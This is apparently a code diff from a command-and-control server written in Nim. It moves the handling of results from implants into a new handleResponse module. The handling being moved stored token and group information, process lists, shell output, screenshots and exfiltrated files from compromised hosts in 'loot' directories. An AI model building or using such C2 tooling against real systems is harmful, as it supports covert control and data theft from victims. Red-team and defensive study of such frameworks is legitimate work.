@@ -2,7 +2,7 @@ import asyncdispatch, asyncfutures, strutils, strformat, json, base64, md5, tabl
 
 import pixie, ws
 
-import types, logging, communication, loot
+import types, logging, communication, loot, handleResponse
 
 proc generateClientHash(c: C2Client): string =
   getMD5(
@@ -70,51 +70,52 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
           cConnected client[]
           client.loaded = true
       of "output":
-        let output = response["data"]["output"].getStr()
-        let category = response["data"]["category"].getStr()
-        case category 
-        of "TOKENINFO":
-          let tokenInformation = parseJson(decode(output))
-          task.output = tokenInformation
-          client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
-          client.tokenInformation.groups = @[]
-          for tokenGroup in tokenInformation["tokenGroups"]:
-            client.tokenInformation.groups.add((
-              name: tokenGroup["name"].getStr(""),
-              sid: tokenGroup["sid"].getStr(""),
-              domain: tokenGroup["domain"].getStr("")))
-        of "PROCESSES":
-          let output = parseJson(decode(output))
-          task.output = output
-          client.processes = @[]
-          for process in output["processes"]:
-            client.processes.add((
-              name: process["name"].getStr(""),
-              id: process["id"].getInt(0)))
-        of "SHELL":
-          task.output = %*{"output": decode(output)}
-          logClientOutput client[], category, output
-        of "SCREENSHOT":
-          infoLog "received screenshot from " & $client[]
-          let decodedImage = decode(output)
-          let image = decodeImage(decodedImage)
-          # task.output = %*{
-          #   "file": encode(image.encodeImage(JpegFormat)),
-          #   "format": "jpeg"
-          # }
-          let filePath = client[].getLootDirectory() & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
-          image.writeFile(filePath)
-          infoLog "saving screenshot from " & $client[] & " to " & filePath
-      of "file":
-        task.output = %*{
-          "file": response["data"]["path"].getStr(),
-          "data": decode response["data"]["contents"].getStr() 
-        }
-        let (_, name, ext) = splitFile response["data"]["path"].getStr()
-        let filePath = client[].getLootDirectory() & "/files/" & name & ext 
-        writeFile(filePath, decode response["data"]["contents"].getStr())
-        infoLog "received file " & name & ext & " from " & $client[]
-        # logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
+        handleResponse(client[], false, response)
+    #     let output = response["data"]["output"].getStr()
+    #     let category = response["data"]["category"].getStr()
+    #     case category 
+    #     of "TOKENINFO":
+    #       let tokenInformation = parseJson(decode(output))
+    #       task.output = tokenInformation
+    #       client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
+    #       client.tokenInformation.groups = @[]
+    #       for tokenGroup in tokenInformation["tokenGroups"]:
+    #         client.tokenInformation.groups.add((
+    #           name: tokenGroup["name"].getStr(""),
+    #           sid: tokenGroup["sid"].getStr(""),
+    #           domain: tokenGroup["domain"].getStr("")))
+    #     of "PROCESSES":
+    #       let output = parseJson(decode(output))
+    #       task.output = output
+    #       client.processes = @[]
+    #       for process in output["processes"]:
+    #         client.processes.add((
+    #           name: process["name"].getStr(""),
+    #           id: process["id"].getInt(0)))
+    #     of "SHELL":
+    #       task.output = %*{"output": decode(output)}
+    #       logClientOutput client[], category, output
+    #     of "SCREENSHOT":
+    #       infoLog "received screenshot from " & $client[]
+    #       let decodedImage = decode(output)
+    #       let image = decodeImage(decodedImage)
+    #       # task.output = %*{
+    #       #   "file": encode(image.encodeImage(JpegFormat)),
+    #       #   "format": "jpeg"
+    #       # }
+    #       let filePath = client[].getLootDirectory() & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
+    #       image.writeFile(filePath)
+    #       infoLog "saving screenshot from " & $client[] & " to " & filePath
+    #   of "file":
+    #     task.output = %*{
+    #       "file": response["data"]["path"].getStr(),
+    #       "data": decode response["data"]["contents"].getStr() 
+    #     }
+    #     let (_, name, ext) = splitFile response["data"]["path"].getStr()
+    #     let filePath = client[].getLootDirectory() & "/files/" & name & ext 
+    #     writeFile(filePath, decode response["data"]["contents"].getStr())
+    #     infoLog "received file " & name & ext & " from " & $client[]
+    #     # logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
     task.markAsCompleted(response)
     for wsConnection in client.server.wsConnections:
       if wsConnection.readyState == Open:
